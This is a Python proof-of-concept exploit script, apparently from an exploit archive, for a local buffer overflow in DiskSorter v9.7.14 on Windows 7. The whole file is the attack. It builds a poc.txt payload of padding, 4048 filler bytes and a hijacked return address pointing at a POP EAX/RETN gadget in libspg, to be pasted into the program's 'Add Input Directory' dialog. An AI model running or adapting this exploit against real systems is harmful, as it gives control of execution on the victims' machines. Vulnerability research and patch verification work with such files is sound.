#!/usr/bin/python

######################################
#	Exploit Title:		DiskSorter v9.7.14 - Input Directory Local Buffer Overflow - PoC
# 	Date: 				25 May 2017
# 	Exploit Author: 	n3ckD_
#	Vendor Homepage:	http://www.disksorter.com/
#	Software Link:		http://www.disksorter.com/setups/disksorter_setup_v9.7.14.exe
#	Version:			Disk Sorter v9.7.14 (32-Bit)
#	Tested on:			Windows 7 Enterprise SP1 (Build 7601)
#	Usage:				Run the exploit, copy the text of the poc.txt into the 'Inputs -> Add Input Directory' dialog
######################################

print "DiskSorter v9.7.14 (32-Bit) - Input Directory Local Buffer Overflow - PoC"
print "Copy the text of poc.txt into the 'Inputs -> Add Input Directory' dialog"

# in libspg:.text
# 10147C1C   58               POP EAX
# 10147C1D   C3               RETN
ret = "\x1c\x7c\x14\x10"

nops = "\x47\x4F"*24
buf = nops + "A"*4048 + ret + "MAGIC" + "\n"

f = open("poc.txt","w")
f.write(buf)
f.close()